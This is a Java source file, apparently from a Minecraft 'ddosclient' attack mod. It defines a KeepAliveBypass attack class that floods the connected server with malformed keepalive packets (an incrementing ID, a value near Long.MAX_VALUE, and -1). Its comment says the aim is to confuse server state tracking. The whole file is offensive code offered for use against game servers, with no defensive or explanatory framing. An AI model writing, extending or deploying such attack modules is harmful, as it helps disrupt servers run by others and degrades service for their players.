package com.ddosclient.attack.attacks;

import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.KeepAliveC2SPacket;

public class KeepAliveBypass extends BaseAttack {
    private long id = 0;

    @Override
    public void execute(MinecraftClient mc) {
        if (mc.getNetworkHandler() == null) return;
        // Send malformed keepalive IDs to confuse server state tracking
        mc.getNetworkHandler().sendPacket(new KeepAliveC2SPacket(id++));
        mc.getNetworkHandler().sendPacket(new KeepAliveC2SPacket(Long.MAX_VALUE - id));
        mc.getNetworkHandler().sendPacket(new KeepAliveC2SPacket(-1L));
    }
}
